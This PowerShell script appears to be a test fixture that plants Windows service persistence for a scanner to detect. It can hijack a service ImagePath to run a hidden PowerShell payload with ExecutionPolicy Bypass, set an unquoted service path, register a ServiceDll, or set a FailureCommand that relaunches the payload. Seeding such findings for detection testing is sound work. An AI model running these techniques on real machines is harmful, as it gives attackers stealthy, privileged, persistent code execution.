script:
if (-not $SERVICE_NAME -or -not $MODE) { throw 'SERVICE_NAME and MODE are required' }
$mode = $MODE.ToLower()
$display = if ($DISPLAY_NAME) { $DISPLAY_NAME } else { $SERVICE_NAME }
if ($PAYLOAD_PATH -and $PAYLOAD_BODY) {
    New-Item -ItemType Directory -Force -Path (Split-Path -Parent $PAYLOAD_PATH) | Out-Null
    Set-Content -LiteralPath $PAYLOAD_PATH -Value $PAYLOAD_BODY -Encoding ascii
}
$svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$SERVICE_NAME"
$existing = Get-Service -Name $SERVICE_NAME -ErrorAction Ignore
if ($existing) {
    Stop-Service -Name $SERVICE_NAME -Force -ErrorAction Ignore
    & sc.exe delete $SERVICE_NAME | Out-Null
    Start-Sleep -Seconds 1
}
if ($mode -eq 'imagepath' -or $mode -eq 'unquoted') {
    if (-not $LEGIT_PATH) { throw "LEGIT_PATH is required for $mode mode" }
    if (-not (Test-Path -LiteralPath $LEGIT_PATH)) {
        New-Item -ItemType Directory -Force -Path (Split-Path -Parent $LEGIT_PATH) | Out-Null
        Copy-Item -LiteralPath (Join-Path $env:SystemRoot 'System32\svchost.exe') -Destination $LEGIT_PATH -Force
    }
}
& sc.exe create $SERVICE_NAME binPath= "`"$env:SystemRoot\System32\svchost.exe`"" DisplayName= "`"$display`"" start= demand | Out-Null
Start-Sleep -Seconds 1
if (-not (Test-Path -LiteralPath $svcKey)) { throw "service key not created: $svcKey" }
switch ($mode) {
    'imagepath' {
        if (-not $PAYLOAD_PATH) { throw 'PAYLOAD_PATH is required for imagepath mode' }
        $payload = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PAYLOAD_PATH`""
        Set-ItemProperty -LiteralPath $svcKey -Name ImagePath -Value $payload -Type String -Force
    }
    'unquoted' {
        # Set the raw value directly: passing a spaced path through sc.exe would
        # get quoted by the native argument binder and destroy the finding.
        Set-ItemProperty -LiteralPath $svcKey -Name ImagePath -Value $LEGIT_PATH -Type String -Force
    }
    'servicedll' {
        if (-not $PAYLOAD_PATH) { throw 'PAYLOAD_PATH is required for servicedll mode' }
        $params = "$svcKey\Parameters"
        if (-not (Test-Path -LiteralPath $params)) { New-Item -Path $params -Force | Out-Null }
        Set-ItemProperty -LiteralPath $params -Name ServiceDll -Value $PAYLOAD_PATH -Type String -Force
    }
    'failurecommand' {
        if (-not $PAYLOAD_PATH) { throw 'PAYLOAD_PATH is required for failurecommand mode' }
        $cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PAYLOAD_PATH`""
        Set-ItemProperty -LiteralPath $svcKey -Name FailureCommand -Value $cmd -Type String -Force
        & sc.exe failure $SERVICE_NAME reset= 86400 actions= restart/60000 | Out-Null
    }
    default { throw "unknown MODE: $MODE" }
}
Write-Output "service key planted: $SERVICE_NAME ($mode)"
